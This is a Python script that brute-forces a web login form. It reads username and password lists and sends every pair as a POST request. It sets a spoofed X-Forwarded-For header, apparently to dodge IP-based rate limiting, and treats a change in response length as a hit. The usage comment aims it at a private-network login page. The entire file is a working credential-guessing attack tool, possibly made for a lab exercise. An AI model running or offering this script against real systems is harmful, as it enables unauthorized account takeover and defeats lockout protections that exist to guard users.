# python3 bruteforce_x_forwarded_for.py --url http://192.168.86.200/login.php --xff 10.10.10.0 --usernames "usernames.txt" --passwords "passwords.txt"
import argparse

import requests


def load_lines(path):
    with open(path, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]


def brute_force(url, xff_ip, username_file, password_file, timeout=5):
    headers = {
        "X-Forwarded-For": xff_ip,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebkit/537.36 (KHTML, like Gecko)",
    }

    try:
        usernames = load_lines(username_file)
        passwords = load_lines(password_file)
    except FileNotFoundError as e:
        print(f"not found file {e.filename}")
        return

    total = len(usernames) * len(passwords)
    done = 0

    print(f"[+] loaded {len(usernames)}/{len(passwords)}")
    print(f"[+] total combinations: {total}")
    print("[+] starting bruteforce")

    for user in usernames:
        for pwd in passwords:
            data = {"user": user, "password": pwd}

            try:
                response = requests.post(
                    url=url, headers=headers, data=data, timeout=timeout
                )

                # print(f"code: {response.status_code}")
                if (response.status_code) == 200:
                    # print(f"found {user}/{pwd}")
                    # print(f"len content:{len(response.text)}")
                    print("200")
                if len(response.text) != 1770:
                    print(f"not 1770: {user}/{pwd}")
                    return
            except requests.exceptions.RequestException as e:
                print(f"error: {e}")
            finally:
                # 현재 진행도를 "완료/전체" 형식으로 표시
                done += 1
                pct = (done / total) * 100 if total else 0
                print(
                    f"\r[-] progress: {done}/{total} ({pct:.1f}%)", end="", flush=True
                )

    print(f"\n[-] bruteforce finished")


def parse_args():
    parser = argparse.ArgumentParser(description="X-Forwarded-for")

    parser.add_argument("-u", "--url", default="http://127.0.0.1/login.php")

    parser.add_argument(
        "-x", "--xff", default="10.10.10.10", help="X-Forwarded-For 에 넣을 IP"
    )

    parser.add_argument(
        "-U", "--usernames", default="usernames.txt", help="user file path"
    )

    parser.add_argument(
        "-P", "--passwords", default="password.txt", help="password file path"
    )

    parser.add_argument("-t", "--timeout", type=int, default=5, help="timeout")

    return parser.parse_args()


def main():
    args = parse_args()
    brute_force(args.url, args.xff, args.usernames, args.passwords, args.timeout)


if __name__ == "__main__":
    main()
